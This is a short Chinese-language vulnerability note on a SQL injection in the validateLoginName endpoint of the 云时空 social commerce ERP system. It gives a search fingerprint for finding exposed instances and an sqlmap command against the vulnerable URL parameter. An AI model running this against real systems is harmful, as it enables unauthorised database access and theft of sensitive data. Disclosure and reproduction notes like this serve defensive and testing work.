# 云时空 社会化商业ERP系统 validateLoginName SQL注入漏洞

## 漏洞描述

云时空 社会化商业ERP系统存在SQL注入漏洞，攻击者通过漏洞可以获取数据库敏感信息

## 漏洞影响

<a-checkbox checked>云时空 社会化商业ERP系统</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="云时空社会化商业ERP"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1630040977210-31a0a314-667a-4cbe-9a9b-dce153582ee0-20220313155426852.png)

使用SQLmap验证漏洞

```python
sqlmap -u "http://xxx.xxx.xxx.xxx/sys/user/validateLoginName?loginName=admin"
```

![img](../../../.vuepress/public/img/1630041138096-be221d73-c3e6-44b8-b0e8-71a999cb58f7.png)